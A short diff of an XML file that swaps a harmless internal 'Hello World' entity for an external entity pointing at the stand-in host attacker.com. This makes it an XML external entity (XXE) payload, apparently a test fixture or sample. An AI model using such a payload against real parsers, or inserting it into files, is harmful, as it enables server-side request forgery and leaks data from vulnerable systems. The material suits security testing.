@@ -1,4 +1,4 @@
-<!DOCTYPE Response [
-  <!ENTITY msg 'Hello World'>
+<!DOCTYPE Message [
+<!ENTITY send SYSTEM "http://attacker.com/working">
 ]>
- <Response>&msg;</Response>
+<Message>&send;</Message>
